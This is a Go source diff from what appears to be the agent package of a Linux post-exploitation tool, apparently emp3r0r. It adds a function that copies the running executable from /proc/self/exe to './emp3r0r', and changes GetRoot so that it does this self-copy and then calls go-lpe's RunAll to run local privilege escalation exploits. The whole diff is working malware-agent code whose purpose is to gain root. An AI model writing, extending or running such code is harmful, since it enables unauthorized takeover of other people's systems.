@@ -3,6 +3,8 @@ package agent
 // build +linux
 
 import (
+	"fmt"
+	"io/ioutil"
 	"log"
 	"os/exec"
 
@@ -10,7 +12,20 @@ import (
 	golpe "github.com/jm33-m0/go-lpe"
 )
 
+// Copy current executable to a new location
+func CopySelfTo(dest_path string) (err error) {
+	elf_data, err := ioutil.ReadFile("/proc/self/exe")
+	if err != nil {
+		return
+	}
+
+	return ioutil.WriteFile(dest_path, elf_data, 0755)
+}
+
 func GetRoot() error {
+	if err := CopySelfTo("./emp3r0r"); err != nil {
+		return fmt.Errorf("Self copy failed: %v", err)
+	}
 	return golpe.RunAll()
 }
 
